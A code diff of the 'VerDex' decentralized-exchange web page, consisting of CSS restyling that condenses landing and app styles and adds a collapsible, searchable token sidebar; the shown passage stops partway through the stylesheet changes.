@@ -5,1363 +5,400 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>VerDex — Decentralized Exchange</title>
-    <link
-      href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=Syne:wght@400;600;700;800&display=swap"
-      rel="stylesheet"
-    />
+    <link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=Syne:wght@400;600;700;800&display=swap" rel="stylesheet"/>
     <style>
       :root {
-        --green: #00ff7f;
-        --green-dim: #00c45e;
-        --green-dark: #00892e;
-        --green-glow: rgba(0, 255, 127, 0.18);
-        --black: #050a06;
-        --dark: #0b110c;
-        --grey: #111712;
-        --grey2: #181f19;
-        --grey3: #232b24;
-        --border: rgba(0, 255, 127, 0.13);
-        --text: #d8f0dc;
-        --text-dim: #6e8b71;
-        --red: #ff4d4d;
-        --font-display: 'Syne', sans-serif;
-        --font-mono: 'Space Mono', monospace;
+        --green: #00ff7f; --green-dim: #00c45e; --green-dark: #00892e;
+        --green-glow: rgba(0,255,127,0.18); --black: #050a06; --dark: #0b110c;
+        --grey: #111712; --grey2: #181f19; --grey3: #232b24;
+        --border: rgba(0,255,127,0.13); --text: #d8f0dc; --text-dim: #6e8b71;
+        --red: #ff4d4d; --font-display: 'Syne', sans-serif; --font-mono: 'Space Mono', monospace;
+        --sidebar-w: 260px;
       }
+      *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+      html { scroll-behavior: smooth; }
+      body { background: var(--black); color: var(--text); font-family: var(--font-display); min-height: 100vh; overflow-x: hidden; }
+      body::before { content: ''; position: fixed; inset: 0; background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='0.04'/%3E%3C/svg%3E"); pointer-events: none; z-index: 9999; opacity: 0.35; }
 
-      *,
-      *::before,
-      *::after {
-        box-sizing: border-box;
-        margin: 0;
+      /* ═══ LANDING ═══ */
+      #landing { min-height: 100vh; display: flex; flex-direction: column; position: relative; background: radial-gradient(ellipse 80% 60% at 50% 0%, rgba(0,255,127,0.07) 0%, transparent 70%), var(--black); }
+      #landing::after { content: ''; position: absolute; inset: 0; background-image: linear-gradient(rgba(0,255,127,0.04) 1px,transparent 1px), linear-gradient(90deg,rgba(0,255,127,0.04) 1px,transparent 1px); background-size: 48px 48px; pointer-events: none; }
+      nav { display: flex; align-items: center; justify-content: space-between; padding: 24px 48px; position: relative; z-index: 10; border-bottom: 1px solid var(--border); backdrop-filter: blur(4px); }
+      .nav-logo { font-family: var(--font-display); font-weight: 800; font-size: 1.6rem; color: var(--green); letter-spacing: -0.03em; text-shadow: 0 0 24px rgba(0,255,127,0.5); display: flex; align-items: center; gap: 10px; }
+      .logo-diamond { width: 18px; height: 18px; background: var(--green); transform: rotate(45deg); box-shadow: 0 0 12px var(--green); flex-shrink: 0; }
+      .nav-links { display: flex; gap: 36px; list-style: none; }
+      .nav-links a { color: var(--text-dim); text-decoration: none; font-size: 0.88rem; font-weight: 600; letter-spacing: 0.05em; text-transform: uppercase; transition: color 0.2s; }
+      .nav-links a:hover { color: var(--green); }
+      .nav-badge { background: var(--green-glow); border: 1px solid var(--border); color: var(--green); font-size: 0.72rem; font-family: var(--font-mono); padding: 4px 12px; border-radius: 20px; letter-spacing: 0.08em; }
+      .hero { flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 80px 24px; position: relative; z-index: 5; }
+      .hero-eyebrow { font-family: var(--font-mono); font-size: 0.75rem; color: var(--green); letter-spacing: 0.2em; text-transform: uppercase; margin-bottom: 24px; display: flex; align-items: center; gap: 12px; }
+      .hero-eyebrow::before, .hero-eyebrow::after { content: ''; flex: 1; max-width: 48px; height: 1px; background: var(--green-dark); }
+      .hero-title { font-size: clamp(3.5rem,9vw,7.5rem); font-weight: 800; line-height: 0.92; letter-spacing: -0.04em; margin-bottom: 28px; }
+      .hero-title span { display: block; color: var(--green); text-shadow: 0 0 60px rgba(0,255,127,0.35); }
+      .hero-sub { font-size: 1.1rem; color: var(--text-dim); max-width: 480px; line-height: 1.6; margin-bottom: 48px; font-weight: 400; }
+      .hero-cta-row { display: flex; gap: 16px; align-items: center; }
+      .btn-launch { background: var(--green); color: var(--black); font-family: var(--font-display); font-weight: 800; font-size: 1rem; letter-spacing: -0.01em; padding: 16px 40px; border: none; border-radius: 4px; cursor: pointer; position: relative; overflow: hidden; transition: transform 0.15s, box-shadow 0.15s; box-shadow: 0 0 32px rgba(0,255,127,0.3); }
+      .btn-launch::after { content: ''; position: absolute; inset: 0; background: linear-gradient(90deg,transparent,rgba(255,255,255,0.2),transparent); transform: translateX(-100%); transition: transform 0.5s; }
+      .btn-launch:hover::after { transform: translateX(100%); }
+      .btn-launch:hover { transform: translateY(-2px); box-shadow: 0 0 48px rgba(0,255,127,0.5); }
+      .btn-ghost { background: transparent; color: var(--text-dim); font-family: var(--font-display); font-weight: 600; font-size: 0.92rem; padding: 16px 32px; border: 1px solid var(--border); border-radius: 4px; cursor: pointer; transition: color 0.2s, border-color 0.2s; }
+      .btn-ghost:hover { color: var(--text); border-color: rgba(0,255,127,0.3); }
+      .stats-bar { display: flex; justify-content: center; gap: 64px; padding: 40px; border-top: 1px solid var(--border); position: relative; z-index: 5; background: rgba(0,0,0,0.3); backdrop-filter: blur(8px); }
+      .stat { text-align: center; }
+      .stat-val { font-family: var(--font-mono); font-size: 1.6rem; font-weight: 700; color: var(--green); display: block; }
+      .stat-label { font-size: 0.75rem; color: var(--text-dim); text-transform: uppercase; letter-spacing: 0.1em; margin-top: 4px; }
+      .orb { position: absolute; border-radius: 50%; filter: blur(80px); pointer-events: none; animation: orbFloat 8s ease-in-out infinite; }
+      .orb1 { width: 400px; height: 400px; background: rgba(0,255,127,0.06); top: -100px; left: -100px; }
+      .orb2 { width: 300px; height: 300px; background: rgba(0,255,127,0.04); bottom: 0; right: -50px; animation-delay: 3s; }
+      @keyframes orbFloat { 0%,100%{transform:translateY(0) scale(1)} 50%{transform:translateY(-30px) scale(1.05)} }
+
+      /* ═══ APP ═══ */
+      #app { display: none; min-height: 100vh; background: var(--dark); flex-direction: column; }
+      #app.visible { display: flex; }
+      .app-header { display: flex; align-items: center; justify-content: space-between; padding: 16px 32px; background: var(--grey); border-bottom: 1px solid var(--border); position: sticky; top: 0; z-index: 100; }
+      .app-logo { font-family: var(--font-display); font-weight: 800; font-size: 1.3rem; color: var(--green); letter-spacing: -0.03em; text-shadow: 0 0 20px rgba(0,255,127,0.4); display: flex; align-items: center; gap: 8px; cursor: pointer; }
+      .btn-connect { background: transparent; color: var(--green); border: 1.5px solid var(--green); font-family: var(--font-mono); font-size: 0.8rem; font-weight: 700; padding: 10px 24px; border-radius: 6px; cursor: pointer; transition: all 0.15s; letter-spacing: 0.02em; box-shadow: 0 0 16px rgba(0,255,127,0.1); }
+      .btn-connect:hover { background: var(--green); color: var(--black); box-shadow: 0 0 24px rgba(0,255,127,0.35); }
+
+      /* ═══ APP BODY ═══ */
+      .app-body { display: flex; flex: 1; overflow: hidden; position: relative; }
+
+      /* ═══ SIDEBAR TOGGLE ═══ */
+      .sidebar-toggle {
+        position: fixed;
+        top: 50%;
+        transform: translateY(-50%);
+        left: var(--sidebar-w);
+        z-index: 300;
+        width: 22px; height: 56px;
+        background: var(--grey);
+        border: 1px solid var(--border);
+        border-left: none;
+        border-radius: 0 7px 7px 0;
+        cursor: pointer;
+        display: flex; align-items: center; justify-content: center;
+        color: var(--green);
+        font-size: 0.75rem;
+        transition: left 0.3s cubic-bezier(0.4,0,0.2,1), background 0.15s, box-shadow 0.15s;
+        box-shadow: 3px 0 14px rgba(0,0,0,0.5);
+        user-select: none;
         padding: 0;
       }
+      .sidebar-toggle:hover { background: var(--grey2); box-shadow: 3px 0 18px rgba(0,255,127,0.15); }
+      .sidebar-toggle.collapsed { left: 0; border-left: 1px solid var(--border); border-right: none; }
+      .toggle-arrow { display: inline-block; transition: transform 0.3s ease; line-height: 1; }
+      .sidebar-toggle.collapsed .toggle-arrow { transform: rotate(180deg); }
 
-      html {
-        scroll-behavior: smooth;
-      }
-
-      body {
-        background: var(--black);
-        color: var(--text);
-        font-family: var(--font-display);
-        min-height: 100vh;
-        overflow-x: hidden;
-      }
-
-      /* ─── NOISE OVERLAY ─── */
-      body::before {
-        content: '';
-        position: fixed;
-        inset: 0;
-        background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='0.04'/%3E%3C/svg%3E");
-        pointer-events: none;
-        z-index: 9999;
-        opacity: 0.35;
-      }
-
-      /* ═══════════════════════════════════
-      LANDING PAGE
-  ═══════════════════════════════════ */
-      #landing {
-        min-height: 100vh;
-        display: flex;
-        flex-direction: column;
-        position: relative;
-        background: radial-gradient(
-            ellipse 80% 60% at 50% 0%,
-            rgba(0, 255, 127, 0.07) 0%,
-            transparent 70%
-          ),
-          var(--black);
-      }
-
-      /* Grid background */
-      #landing::after {
-        content: '';
-        position: absolute;
-        inset: 0;
-        background-image: linear-gradient(
-            rgba(0, 255, 127, 0.04) 1px,
-            transparent 1px
-          ),
-          linear-gradient(90deg, rgba(0, 255, 127, 0.04) 1px, transparent 1px);
-        background-size: 48px 48px;
-        pointer-events: none;
-      }
-
-      /* ─── NAV ─── */
-      nav {
-        display: flex;
-        align-items: center;
-        justify-content: space-between;
-        padding: 24px 48px;
-        position: relative;
-        z-index: 10;
-        border-bottom: 1px solid var(--border);
-        backdrop-filter: blur(4px);
-      }
-
-      .nav-logo {
-        font-family: var(--font-display);
-        font-weight: 800;
-        font-size: 1.6rem;
-        color: var(--green);
-        letter-spacing: -0.03em;
-        text-shadow: 0 0 24px rgba(0, 255, 127, 0.5);
-        display: flex;
-        align-items: center;
-        gap: 10px;
-      }
-
-      .logo-diamond {
-        width: 18px;
-        height: 18px;
-        background: var(--green);
-        transform: rotate(45deg);
-        box-shadow: 0 0 12px var(--green);
-        flex-shrink: 0;
-      }
-
-      .nav-links {
-        display: flex;
-        gap: 36px;
-        list-style: none;
-      }
-      .nav-links a {
-        color: var(--text-dim);
-        text-decoration: none;
-        font-size: 0.88rem;
-        font-weight: 600;
-        letter-spacing: 0.05em;
-        text-transform: uppercase;
-        transition: color 0.2s;
-      }
-      .nav-links a:hover {
-        color: var(--green);
-      }
-
-      .nav-badge {
-        background: var(--green-glow);
-        border: 1px solid var(--border);
-        color: var(--green);
-        font-size: 0.72rem;
-        font-family: var(--font-mono);
-        padding: 4px 12px;
-        border-radius: 20px;
-        letter-spacing: 0.08em;
-      }
-
-      /* ─── HERO ─── */
-      .hero {
-        flex: 1;
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-        justify-content: center;
-        text-align: center;
-        padding: 80px 24px;
-        position: relative;
-        z-index: 5;
-      }
-
-      .hero-eyebrow {
-        font-family: var(--font-mono);
-        font-size: 0.75rem;
-        color: var(--green);
-        letter-spacing: 0.2em;
-        text-transform: uppercase;
-        margin-bottom: 24px;
-        display: flex;
-        align-items: center;
-        gap: 12px;
-      }
-      .hero-eyebrow::before,
-      .hero-eyebrow::after {
-        content: '';
-        flex: 1;
-        max-width: 48px;
-        height: 1px;
-        background: var(--green-dark);
-      }
-
-      .hero-title {
-        font-size: clamp(3.5rem, 9vw, 7.5rem);
-        font-weight: 800;
-        line-height: 0.92;
-        letter-spacing: -0.04em;
-        margin-bottom: 28px;
-      }
-      .hero-title span {
-        display: block;
-        color: var(--green);
-        text-shadow: 0 0 60px rgba(0, 255, 127, 0.35);
-      }
-
-      .hero-sub {
-        font-size: 1.1rem;
-        color: var(--text-dim);
-        max-width: 480px;
-        line-height: 1.6;
-        margin-bottom: 48px;
-        font-weight: 400;
-      }
-
-      .hero-cta-row {
-        display: flex;
-        gap: 16px;
-        align-items: center;
-      }
-
-      .btn-launch {
-        background: var(--green);
-        color: var(--black);
-        font-family: var(--font-display);
-        font-weight: 800;
-        font-size: 1rem;
-        letter-spacing: -0.01em;
-        padding: 16px 40px;
-        border: none;
-        border-radius: 4px;
-        cursor: pointer;
-        position: relative;
-        overflow: hidden;
-        transition: transform 0.15s, box-shadow 0.15s;
-        box-shadow: 0 0 32px rgba(0, 255, 127, 0.3);
-      }
-      .btn-launch::after {
-        content: '';
-        position: absolute;
-        inset: 0;
-        background: linear-gradient(
-          90deg,
-          transparent,
-          rgba(255, 255, 255, 0.2),
-          transparent
-        );
-        transform: translateX(-100%);
-        transition: transform 0.5s;
-      }
-      .btn-launch:hover::after {
-        transform: translateX(100%);
-      }
-      .btn-launch:hover {
-        transform: translateY(-2px);
-        box-shadow: 0 0 48px rgba(0, 255, 127, 0.5);
-      }
-      .btn-launch:active {
-        transform: translateY(0);
-      }
-
-      .btn-ghost {
-        background: transparent;
-        color: var(--text-dim);
-        font-family: var(--font-display);
-        font-weight: 600;
-        font-size: 0.92rem;
-        padding: 16px 32px;
-        border: 1px solid var(--border);
-        border-radius: 4px;
-        cursor: pointer;
-        transition: color 0.2s, border-color 0.2s;
-      }
-      .btn-ghost:hover {
-        color: var(--text);
-        border-color: rgba(0, 255, 127, 0.3);
-      }
-
-      /* ─── STATS BAR ─── */
-      .stats-bar {
-        display: flex;
-        justify-content: center;
-        gap: 64px;
-        padding: 40px;
-        border-top: 1px solid var(--border);
-        position: relative;
-        z-index: 5;
-        background: rgba(0, 0, 0, 0.3);
-        backdrop-filter: blur(8px);
-      }
-      .stat {
-        text-align: center;
-      }
-      .stat-val {
-        font-family: var(--font-mono);
-        font-size: 1.6rem;
-        font-weight: 700;
-        color: var(--green);
-        display: block;
-      }
-      .stat-label {
-        font-size: 0.75rem;
-        color: var(--text-dim);
-        text-transform: uppercase;
-        letter-spacing: 0.1em;
-        margin-top: 4px;
-      }
-
-      /* ─── FLOATING ORBS ─── */
-      .orb {
-        position: absolute;
-        border-radius: 50%;
-        filter: blur(80px);
-        pointer-events: none;
-        animation: orbFloat 8s ease-in-out infinite;
-      }
-      .orb1 {
-        width: 400px;
-        height: 400px;
-        background: rgba(0, 255, 127, 0.06);
-        top: -100px;
-        left: -100px;
-        animation-delay: 0s;
-      }
-      .orb2 {
-        width: 300px;
-        height: 300px;
-        background: rgba(0, 255, 127, 0.04);
-        bottom: 0;
-        right: -50px;
-        animation-delay: 3s;
-      }
-      @keyframes orbFloat {
-        0%,
-        100% {
-          transform: translateY(0) scale(1);
-        }
-        50% {
-          transform: translateY(-30px) scale(1.05);
-        }
-      }
-
-      /* ═══════════════════════════════════
-      APP PAGE
-  ═══════════════════════════════════ */
-      #app {
-        display: none;
-        min-height: 100vh;
-        background: var(--dark);
-        flex-direction: column;
-      }
-      #app.visible {
-        display: flex;
-      }
-
-      /* ─── APP HEADER ─── */
-      .app-header {
-        display: flex;
-        align-items: center;
-        justify-content: space-between;
-        padding: 16px 32px;
-        background: var(--grey);
-        border-bottom: 1px solid var(--border);
-        position: sticky;
-        top: 0;
-        z-index: 100;
-      }
-
-      .app-logo {
-        font-family: var(--font-display);
-        font-weight: 800;
-        font-size: 1.3rem;
-        color: var(--green);
-        letter-spacing: -0.03em;
-        text-shadow: 0 0 20px rgba(0, 255, 127, 0.4);
-        display: flex;
-        align-items: center;
-        gap: 8px;
-        cursor: pointer;
-      }
-
-      .app-nav {
-        display: flex;
-        gap: 4px;
-        background: var(--grey2);
-        border: 1px solid var(--border);
-        border-radius: 8px;
-        padding: 4px;
-      }
-      .app-nav-btn {
-        padding: 8px 20px;
-        border-radius: 6px;
-        font-family: var(--font-display);
-        font-weight: 600;
-        font-size: 0.85rem;
-        cursor: pointer;
-        border: none;
-        color: var(--text-dim);
-        background: transparent;
-        transition: all 0.15s;
-      }
-      .app-nav-btn.active {
-        background: var(--green);
-        color: var(--black);
-      }
-      .app-nav-btn:not(.active):hover {
-        color: var(--text);
-      }
-
-      .btn-connect {
-        background: transparent;
-        color: var(--green);
-        border: 1.5px solid var(--green);
-        font-family: var(--font-mono);
-        font-size: 0.8rem;
-        font-weight: 700;
-        padding: 10px 24px;
-        border-radius: 6px;
-        cursor: pointer;
-        transition: all 0.15s;
-        letter-spacing: 0.02em;
-        box-shadow: 0 0 16px rgba(0, 255, 127, 0.1);
-      }
-      .btn-connect:hover {
-        background: var(--green);
-        color: var(--black);
-        box-shadow: 0 0 24px rgba(0, 255, 127, 0.35);
-      }
-
-      /* ─── APP BODY ─── */
-      .app-body {
-        display: flex;
-        flex: 1;
-        overflow: hidden;
-      }
-
-      /* ─── SIDEBAR TICKER ─── */
+      /* ═══ SIDEBAR ═══ */
       .sidebar {
-        width: 260px;
-        height: 143vh;      /* Lock it to the screen height exactly */
-        position: sticky;   /* Keep it pinned while you scroll the main page */
+        width: var(--sidebar-w);
         flex-shrink: 0;
         background: var(--grey);
         border-right: 1px solid var(--border);
-        overflow-y: auto;
-        display: flex;
-        flex-direction: column;
-        padding: 16px 0;
-        
+        overflow: hidden;
+        display: flex; flex-direction: column;
+        /* smooth slide */
+        transition: width 0.3s cubic-bezier(0.4,0,0.2,1), opacity 0.25s ease;
       }
+      .sidebar.collapsed { width: 0; opacity: 0; }
 
-      .sidebar-title {
-        font-size: 0.7rem;
-        text-transform: uppercase;
-        letter-spacing: 0.12em;
-        color: var(--text-dim);
-        padding: 0 16px 12px;
-        font-family: var(--font-mono);
+      /* sidebar header: search row */
+      .sidebar-header {
+        padding: 12px 14px 10px;
         border-bottom: 1px solid var(--border);
-        margin-bottom: 8px;
-      }
-
-      .token-row {
-        display: flex;
-        align-items: center;
-        gap: 10px;
-        padding: 10px 16px;
-        cursor: pointer;
-        transition: background 0.12s;
-        border-radius: 0;
-      }
-      .token-row:hover {
-        background: var(--grey2);
-      }
-      .token-row.selected {
-        background: rgba(0, 255, 127, 0.07);
-        border-left: 2px solid var(--green);
-      }
-
-      .token-icon {
-        width: 32px;
-        height: 32px;
-        border-radius: 50%;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        font-size: 0.75rem;
-        font-weight: 700;
         flex-shrink: 0;
-        font-family: var(--font-mono);
+        background: var(--grey);
       }
-
-      .token-info {
-        flex: 1;
-        min-width: 0;
-      }
-      .token-sym {
-        font-weight: 700;
-        font-size: 0.85rem;
-        font-family: var(--font-mono);
-        color: var(--text);
-        display: block;
-      }
-      .token-name {
-        font-size: 0.7rem;
-        color: var(--text-dim);
+      .sidebar-top-row {
+        display: flex; align-items: center; justify-content: space-between;
+        margin-bottom: 10px;
         white-space: nowrap;
-        overflow: hidden;
-        text-overflow: ellipsis;
       }
-
-      .token-price-col {
-        text-align: right;
+      .sidebar-label {
+        font-size: 0.68rem; text-transform: uppercase; letter-spacing: 0.12em;
+        color: var(--green); font-family: var(--font-mono); font-weight: 700;
       }
-      .token-price {
-        font-family: var(--font-mono);
-        font-size: 0.82rem;
-        color: var(--text);
-        display: block;
-        font-weight: 700;
-      }
-      .token-change {
-        font-family: var(--font-mono);
-        font-size: 0.7rem;
-        display: block;
-      }
-      .pos {
-        color: var(--green);
-      }
-      .neg {
-        color: var(--red);
-      }
-       /* ─── SIDEBAR TICKER ─── */
-  .sidebar {
-    width: 260px; flex-shrink: 0;
-    background: var(--grey);
-    border-right: 1px solid var(--border);
-    overflow-y: auto; overflow-x: hidden;
-    display: flex; flex-direction: column;
-    padding: 16px 0;
-    transition: width 0.28s cubic-bezier(0.4,0,0.2,1),
-                opacity 0.22s ease,
-                padding 0.28s ease;
-    position: relative;
-  }
-  .sidebar.collapsed {
-    width: 0;
-    padding: 0;
-    opacity: 0;
-    border-right-color: transparent;
-    overflow: hidden;
-  }
- 
-  /* Toggle button — floats just outside the sidebar edge */
-  .sidebar-toggle {
-    position: fixed;
-    top: 50%;
-    transform: translateY(-50%);
-    left: 260px; /* matches sidebar width */
-    z-index: 200;
-    width: 20px; height: 52px;
-    background: var(--grey);
-    border: 1px solid var(--border);
-    border-left: none;
-    border-radius: 0 6px 6px 0;
-    cursor: pointer;
-    display: flex; align-items: center; justify-content: center;
-    color: var(--green);
-    font-size: 0.65rem;
-    transition: left 0.28s cubic-bezier(0.4,0,0.2,1),
-                background 0.15s, color 0.15s;
-    box-shadow: 3px 0 12px rgba(0,0,0,0.4);
-  }
-  .sidebar-toggle:hover {
-    background: var(--grey2);
-    color: var(--text);
-    box-shadow: 3px 0 18px rgba(0,255,127,0.12);
-  }
-  .sidebar-toggle.collapsed {
-    left: 0;
-    border-left: 1px solid var(--border);
-    border-right: none;
-    border-radius: 0 6px 6px 0;
-  }
-  /* Arrow chevron inside the button */
-  .toggle-arrow {
-    display: inline-block;
-    transition: transform 0.28s ease;
-    line-height: 1;
-  }
-  .sidebar-toggle.collapsed .toggle-arrow {
-    transform: rotate(180deg);
-  }
- 
-  .sidebar-title {
-    font-size: 0.7rem; text-transform: uppercase;
-    letter-spacing: 0.12em; color: var(--text-dim);
-    padding: 0 16px 12px;
-    font-family: var(--font-mono);
-    border-bottom: 1px solid var(--border);
-    margin-bottom: 8px;
-    white-space: nowrap;
-  }
- 
-  .token-row {
-    display: flex; align-items: center; gap: 10px;
-    padding: 10px 16px; cursor: pointer;
-    transition: background 0.12s;
-    border-radius: 0;
-  }
-  .token-row:hover { background: var(--grey2); }
-  .token-row.selected { background: rgba(0,255,127,0.07); border-left: 2px solid var(--green); }
- 
-  .token-icon {
-    width: 32px; height: 32px; border-radius: 50%;
-    display: flex; align-items: center; justify-content: center;
-    font-size: 0.75rem; font-weight: 700; flex-shrink: 0;
-    font-family: var(--font-mono);
-  }
- 
-  .token-info { flex: 1; min-width: 0; }
-  .token-sym {
-    font-weight: 700; font-size: 0.85rem; font-family: var(--font-mono);
-    color: var(--text); display: block;
-  }
-  .token-name {
-    font-size: 0.7rem; color: var(--text-dim);
-    white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
-  }
- 
-  .token-price-col { text-align: right; }
-  .token-price {
-    font-family: var(--font-mono); font-size: 0.82rem;
-    color: var(--text); display: block; font-weight: 700;
-  }
-  .token-change {
-    font-family: var(--font-mono); font-size: 0.7rem;
-    display: block;
-  }
-  .pos { color: var(--green); }
-  .neg { color: var(--red); }
- 
-
-      /* ─── MAIN CONTENT ─── */
-      .main-content {
-        flex: 1;
-        overflow-y: auto;
-        padding: 28px;
-        display: flex;
-        gap: 24px;
-        align-items: flex-start;
-      }
-
-      /* ─── CHART AREA ─── */
-      .chart-section {
-        flex: 1;
-        min-width: 0;
-      }
-      .chart-box {
-        background: var(--grey);
-        border: 1px solid var(--border);
-        border-radius: 8px;
-        padding: 20px;
-        height: 320px;
-        position: relative;
-        overflow: hidden;
-        margin-bottom: 20px;
-      }
-
-      
-
-      /* ─── MARKET STATS ROW ─── */
-      .market-stats {
-        display: grid;
-        grid-template-columns: repeat(4, 1fr);
-        gap: 12px;
-        margin-bottom: 20px;
-      }
-      .mstat {
-        background: var(--grey);
-        border: 1px solid var(--border);
-        border-radius: 8px;
-        padding: 14px 16px;
-      }
-      .mstat-label {
-        font-size: 0.68rem;
-        color: var(--text-dim);
-        text-transform: uppercase;
-        letter-spacing: 0.1em;
-        font-family: var(--font-mono);
-        margin-bottom: 6px;
-      }
-      .mstat-val {
-        font-family: var(--font-mono);
-        font-size: 1rem;
-        font-weight: 700;
-        color: var(--text);
-      }
-
-      /* ─── ORDER BOOK ─── */
-      .order-book {
-        background: var(--grey);
-        border: 1px solid var(--border);
-        border-radius: 8px;
-        overflow: hidden;
-      }
-      .ob-title {
-        padding: 12px 16px;
-        font-size: 0.75rem;
-        font-family: var(--font-mono);
-        font-weight: 700;
-        color: var(--text-dim);
-        text-transform: uppercase;
-        letter-spacing: 0.1em;
-        border-bottom: 1px solid var(--border);
-      }
-      .ob-headers {
-        display: grid;
-        grid-template-columns: 1fr 1fr 1fr;
-        padding: 6px 16px;
-        font-size: 0.65rem;
-        color: var(--text-dim);
-        font-family: var(--font-mono);
-        text-transform: uppercase;
-        letter-spacing: 0.08em;
-        border-bottom: 1px solid var(--border);
-      }
-      .ob-headers span:last-child {
-        text-align: right;
-      }
-      .ob-row {
-        display: grid;
-        grid-template-columns: 1fr 1fr 1fr;
-        padding: 4px 16px;
-        position: relative;
-        font-size: 0.75rem;
-        font-family: var(--font-mono);
-        transition: background 0.1s;
-      }
-      .ob-row:hover {
-        background: var(--grey2);
-      }
-      .ob-bar {
-        position: absolute;
-        top: 0;
-        bottom: 0;
-        right: 0;
-        opacity: 0.12;
-      }
-      .ob-row.ask .ob-bar {
-        background: var(--red);
-      }
-      .ob-row.bid .ob-bar {
-        background: var(--green);
-      }
-      .ob-row.ask .ob-price {
-        color: var(--red);
-      }
-      .ob-row.bid .ob-price {
-        color: var(--green);
-      }
-      .ob-row span:last-child {
-        text-align: right;
-        color: var(--text-dim);
-      }
-
-      .ob-spread {
-        text-align: center;
-        padding: 8px;
-        font-family: var(--font-mono);
-        font-size: 0.75rem;
-        color: var(--text-dim);
-        border-top: 1px solid var(--border);
-        border-bottom: 1px solid var(--border);
-      }
-      .ob-spread span {
-        color: var(--text);
-        font-weight: 700;
-      }
-
-      /* ─── SWAP PANEL ─── */
-      .swap-panel {
-        width: 350px;
-        flex-shrink: 0;
-      }
-
-      .swap-box {
-        background: var(--grey);
-        border: 1px solid var(--border);
-        border-radius: 12px;
-        overflow: hidden;
-        margin-bottom: 16px;
-      }
-
-      .swap-tabs {
-        display: flex;
-        border-bottom: 1px solid var(--border);
-      }
-      .swap-tab {
-        flex: 1;
-        padding: 14px;
-        text-align: center;
-        cursor: pointer;
-        font-weight: 700;
-        font-size: 0.88rem;
-        color: var(--text-dim);
-        background: transparent;
-        border: none;
-        transition: all 0.15s;
-      }
-      .swap-tab.active {
-        color: var(--green);
-        border-bottom: 2px solid var(--green);
-        background: rgba(0, 255, 127, 0.04);
-      }
-
-      .swap-body {
-        padding: 20px;
-      }
-
-      .swap-field {
-        background: var(--grey2);
-        border: 1px solid var(--border);
-        border-radius: 8px;
-        padding: 14px 16px;
-        margin-bottom: 8px;
-        transition: border-color 0.15s;
-      }
-      .swap-field:focus-within {
-        border-color: rgba(0, 255, 127, 0.4);
-      }
-
-      .swap-field-top {
-        display: flex;
-        align-items: center;
-        justify-content: space-between;
-        margin-bottom: 8px;
-      }
-      .swap-field-label {
-        font-size: 0.72rem;
-        color: var(--text-dim);
-        font-family: var(--font-mono);
-        text-transform: uppercase;
-        letter-spacing: 0.08em;
-      }
-      .swap-balance {
-        font-size: 0.72rem;
-        color: var(--text-dim);
-        font-family: var(--font-mono);
-      }
-      .swap-balance span {
-        color: var(--green);
-        cursor: pointer;
-      }
-
-      .swap-field-bottom {
-        display: flex;
-        align-items: center;
-        gap: 12px;
-      }
-      .swap-amount {
-        flex: 1;
-        background: transparent;
-        border: none;
-        outline: none;
-        font-family: var(--font-mono);
-        font-size: 1.4rem;
-        font-weight: 700;
-        color: var(--text);
+      .sidebar-search {
         width: 100%;
-      }
-      .swap-amount::placeholder {
-        color: var(--text-dim);
-      }
-
-      .swap-token-sel {
-        display: flex;
-        align-items: center;
-        gap: 8px;
-        background: var(--grey3);
-        border: 1px solid var(--border);
+        background: rgba(255,255,255,0.05);
+        border: 1px solid rgba(255,255,255,0.1);
         border-radius: 6px;
         padding: 8px 12px;
-        cursor: pointer;
-        white-space: nowrap;
-        transition: background 0.12s;
-        font-weight: 700;
-        font-size: 0.88rem;
-        color: var(--text);
-      }
-      .swap-token-sel:hover {
-        background: rgba(0, 255, 127, 0.07);
-      }
-
-      .token-dot {
-        width: 20px;
-        height: 20px;
-        border-radius: 50%;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        font-size: 0.55rem;
-        font-weight: 700;
-        flex-shrink: 0;
-      }
-
-      .swap-arrow-btn {
-        width: 36px;
-        height: 36px;
-        border-radius: 50%;
-        background: var(--grey2);
-        border: 1px solid var(--border);
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        cursor: pointer;
-        margin: -4px auto;
-        position: relative;
-        z-index: 2;
-        color: var(--green);
-        font-size: 1.1rem;
-        transition: all 0.2s;
-      }
-      .swap-arrow-btn:hover {
-        background: var(--green);
-        color: var(--black);
-        border-color: var(--green);
-        transform: rotate(180deg);
-      }
-
-      .swap-info {
-        background: var(--grey2);
-        border: 1px solid var(--border);
-        border-radius: 8px;
-        padding: 14px 16px;
-        margin-top: 12px;
-        margin-bottom: 16px;
-      }
-      .swap-info-row {
-        display: flex;
-        justify-content: space-between;
+        color: #fff;
         font-size: 0.78rem;
         font-family: var(--font-mono);
-        color: var(--text-dim);
-        margin-bottom: 6px;
-      }
-      .swap-info-row:last-child {
-        margin-bottom: 0;
-      }
-      .swap-info-row span:last-child {
-        color: var(--text);
-      }
-
-      .btn-swap {
-        width: 100%;
-        padding: 16px;
-        background: var(--green);
-        color: var(--black);
-        font-family: var(--font-display);
-        font-weight: 800;
-        font-size: 1rem;
-        border: none;
-        border-radius: 8px;
-        cursor: pointer;
-        letter-spacing: -0.01em;
-        transition: all 0.15s;
-        box-shadow: 0 0 24px rgba(0, 255, 127, 0.25);
-      }
-      .btn-swap:hover {
-        transform: translateY(-1px);
-        box-shadow: 0 0 36px rgba(0, 255, 127, 0.4);
-      }
-      .btn-swap:active {
-        transform: translateY(0);
-      }
-
-      /* ─── SLIPPAGE ─── */
-      .slippage-row {
-        display: flex;
-        align-items: center;
-        gap: 8px;
